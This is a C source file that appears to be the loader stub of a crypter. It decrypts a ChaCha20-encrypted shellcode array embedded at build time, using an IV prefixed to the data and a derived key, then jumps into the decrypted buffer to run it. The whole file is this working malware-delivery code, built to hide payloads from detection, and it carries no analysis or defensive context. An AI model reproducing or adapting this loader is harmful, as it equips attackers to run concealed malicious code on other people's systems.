#include <openssl/conf.h>
#include <openssl/err.h>
#include <openssl/evp.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "common.h"

unsigned char shellcode[] = STR(SHELLCODE);

int
main(void)
{
	EVP_CIPHER_CTX	*ctx;
	unsigned char	 b[BUFSIZ];
	unsigned char	 iv[12];	/* The IV length is 96 bits. */
	unsigned char	 key[32];	/* The key length is 256 bits. */
	unsigned char	*ptr = shellcode + 12;
	int		 bl, ol;

	common_key(key);			/* Get dynamic key. */
	memcpy(iv, shellcode, sizeof iv);	/* Save the prefixed IV. */

	if ((ctx = EVP_CIPHER_CTX_new()) == NULL)
		CRYPTER_SSLERR();
	if (EVP_DecryptInit_ex(ctx, EVP_chacha20(), NULL, key, iv) == 0)
		CRYPTER_SSLERR();
	if (EVP_DecryptUpdate(
	    ctx, b, &bl, ptr, strlen((char *) shellcode) - sizeof iv) == 0)
		CRYPTER_SSLERR();
	if (EVP_DecryptFinal_ex(ctx, b + bl, &ol) == 0)
		CRYPTER_SSLERR();

	(*(void(*)(void)) b)();		/* Execute decrypted shellcode. */
	return (0);			/* NOTREACHED */
}
